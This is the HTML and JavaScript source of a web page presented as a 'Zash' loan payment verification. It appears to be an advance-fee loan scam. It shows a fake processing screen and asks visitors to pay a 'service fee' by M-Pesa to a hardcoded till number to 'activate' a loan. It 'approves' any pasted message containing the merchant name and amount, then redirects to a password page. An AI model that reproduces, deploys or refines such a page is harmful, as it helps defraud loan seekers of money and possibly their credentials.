<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Zash Loan Payment Verification</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gradient-to-br from-[#FF4E50] via-[#FF6A5C] to-[#FF7C65] min-h-screen text-[#b60000]">

  <!-- Top-left Zash Logo -->
  <div class="absolute top-4 left-4 z-50">
    <img src="zashlogo.jpeg" alt="Zash Logo" class="w-12 h-12 rounded-full shadow-lg" />
  </div>

  <!-- Loader Screen -->
  <div id="loaderScreen" class="flex flex-col items-center justify-center min-h-screen bg-white p-4">
    <div class="animate-spin rounded-full h-12 w-12 border-t-4 border-red-600 border-opacity-50 mb-4"></div>
    <p class="text-lg font-medium text-gray-700">Processing...</p>
  </div>

  <!-- Main Content -->
  <div id="mainContent" class="hidden flex items-center justify-center min-h-screen p-4">
    <div class="bg-white/90 backdrop-blur-md w-full max-w-md p-6 rounded-2xl shadow-2xl text-center">
      
      <h1 class="text-xl font-bold text-[#FF4E50] mb-2">Loan Payment Verification</h1>
      <p class="text-sm text-gray-700 mb-4">To activate your loan, please pay the service fee to the Till Number below.</p>

      <!-- Loan Summary -->
      <div class="text-left bg-[#FFF5F5] p-4 rounded-xl border border-[#FFD4D4] text-sm space-y-2 mb-6">
        <p><strong>Loan Amount:</strong> Ksh <span id="verifyLoan">...</span></p>
        <p><strong>Service Fee (6.4%):</strong> <span id="verifyFee">...</span></p>
        <p><strong>Pay Till Number:</strong> 
          <span class="font-bold text-[#FF4E50]" id="tillNumber">9824375</span>
          <button onclick="copyTill()" class="ml-2 px-2 py-1 text-xs bg-[#FF4E50] text-white rounded">Copy</button>
        </p>
        <p class="text-xs text-gray-600">Use your M-Pesa to send the exact service fee via Buy Goods and Services.</p>
      </div>

      <!-- Guide Section -->
      <div class="text-left text-sm mb-4 bg-yellow-50 border-l-4 border-yellow-400 p-3 rounded">
        <p class="font-medium">📋 How to Pay: HAKIKA R PROVISION</p>
        <ol class="list-decimal pl-5 mt-1 space-y-1">
          <li>Go to M-Pesa > Lipa na M-Pesa</li>
          <li>Select <strong>Buy Goods and Services</strong></li>
          <li>Enter Till Number: <strong>9824375</strong></li>
          <li>Enter Amount: <strong id="guideFee">...</strong></li>
          <li>Enter M-Pesa PIN and Send</li>
        </ol>
      </div>

      <!-- Mpesa Code Input -->
      <div class="mb-4 text-left">
        <label for="mpesaText" class="block text-sm font-medium mb-1">Paste M-Pesa Confirmation Message</label>
        <textarea id="mpesaText" rows="3" placeholder="e.g. QHG4RT8Y Confirmed. Ksh120 sent to HAKIKA R PROVISION..."
          class="w-full p-3 rounded-xl border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#FF4E50] text-sm"></textarea>
      </div>

      <!-- Submit Button -->
      <button onclick="submitMpesaMessage()"
              class="w-full bg-[#FF4E50] hover:bg-[#e93e3f] text-white font-semibold py-3 rounded-xl shadow-md transition">
        Submit & Continue
      </button>
    </div>
  </div>

  <script>
    // Load localStorage data
    const name = localStorage.getItem("fullName") || "User";
    const loan = localStorage.getItem("loanAmount") || "0";
    const fee = localStorage.getItem("processingFee") || "0";
    const feeInt = parseInt(fee);
    const tillNumber = "9824375";

    // Populate values
    window.onload = () => {
      document.getElementById("verifyLoan").textContent = parseInt(loan).toLocaleString();
      document.getElementById("verifyFee").textContent = "Ksh " + feeInt.toLocaleString();
      document.getElementById("guideFee").textContent = "Ksh " + feeInt.toLocaleString();

      // Show main content after 3 seconds
      setTimeout(() => {
        document.getElementById("loaderScreen").classList.add("hidden");
        document.getElementById("mainContent").classList.remove("hidden");
      }, 3000);
    };

    // Copy Till Number
    function copyTill() {
      navigator.clipboard.writeText(tillNumber)
        .then(() => alert("Till Number copied: " + tillNumber))
        .catch(() => alert("Failed to copy"));
    }

    // Submit M-Pesa Confirmation
    function submitMpesaMessage() {
      const message = document.getElementById("mpesaText").value.trim().toUpperCase();
      const hasKeyword = message.includes("HAKIKA R PROVISION");
      const hasFee = message.includes(feeInt.toString()) || message.includes("KSH" + feeInt) || message.includes("KSH " + feeInt);

      if (message.length < 10 || !hasKeyword || !hasFee) {
        alert("❌ Invalid message. Please ensure it contains:\n- HAKIKA R PROVISION\n- Ksh " + feeInt);
        return;
      }

      localStorage.setItem("mpesaMessage", message);
      alert("✅ Your payment has been successfully approved!");
      window.location.href = "password.html";
    }
  </script>

</body>
</html>
